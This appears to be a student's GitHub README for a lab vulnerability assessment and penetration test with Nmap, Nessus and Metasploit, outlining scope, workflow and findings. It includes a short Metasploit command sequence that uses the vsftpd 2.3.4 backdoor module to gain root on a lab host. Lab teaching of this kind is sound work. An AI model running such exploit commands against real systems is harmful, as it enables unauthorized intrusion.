
# 🔒 Network Vulnerability Assessment and Penetration Testing

A comprehensive Vulnerability Assessment and Penetration Testing (VAPT) project conducted in a controlled virtual lab environment using **Nmap**, **Tenable Nessus**, and **Metasploit Framework**. This project demonstrates the complete security assessment lifecycle, including reconnaissance, vulnerability scanning, exploitation verification, and reporting.

---

## 📌 Project Overview

The objective of this project was to identify security vulnerabilities within a target network, verify the exploitability of critical findings, and provide remediation recommendations based on industry best practices.

The assessment followed a standard VAPT methodology:

- Network Discovery
- Service Enumeration
- Vulnerability Assessment
- Exploitation Verification
- Security Recommendations

---

## 🎯 Objectives

- Discover active hosts and open ports.
- Identify running services and operating systems.
- Perform automated vulnerability scanning.
- Validate critical vulnerabilities through controlled exploitation.
- Document findings with supporting evidence.
- Recommend mitigation strategies.

---

## 🛠️ Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Network Discovery & Service Enumeration |
| Tenable Nessus Essentials | Vulnerability Assessment |
| Metasploit Framework | Exploitation Verification |
| Kali Linux | Penetration Testing Platform |
| VirtualBox | Virtual Lab Environment |

---

## 🌐 Target Scope

**Network Range**

```
192.168.1.0/24
```

**Primary Target**

```
192.168.1.10
```

---

## 📂 Repository Structure

```
network-vulnerability-assessment-report/
│
├── README.md
├── LICENSE
├── Report/
│   └── Vulnerability_Assessment_Report.pdf
├── Screenshots/
│   ├── nmap-scan.png
│   ├── nessus-configuration.png
│   ├── nessus-results.png
│   └── metasploit-exploit.png
├── Commands/
│   └── commands.md
└── Images/
```

---

## 🔄 Assessment Workflow

```
Reconnaissance
        │
        ▼
Service Enumeration (Nmap)
        │
        ▼
Vulnerability Scanning (Nessus)
        │
        ▼
Exploitation Verification (Metasploit)
        │
        ▼
Risk Analysis
        │
        ▼
Recommendations & Report
```

---

## 💻 Sample Commands

### Nmap

```bash
nmap -sV -sC -O 192.168.1.10
```

### Metasploit

```bash
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor

set RHOSTS 192.168.1.10

exploit

whoami
```

---

## 📊 Key Findings

- Network reconnaissance successfully identified active hosts and services.
- Nessus detected multiple vulnerabilities with different severity levels.
- Critical vulnerabilities were validated using Metasploit.
- Root-level access was successfully demonstrated in the controlled lab environment.
- Security recommendations were provided to mitigate identified risks.

---

## 📄 Report

The complete project report is available in the **Report** directory.

---

## ⚠️ Disclaimer

This repository is intended **only for educational and research purposes**.

All testing was performed in an isolated virtual laboratory with authorized systems. Do **not** use these techniques against systems without explicit permission.

---

## 👩‍💻 Author

**Habiba Shafait**

BS Information Technology

Government College Women University, Sialkot

---
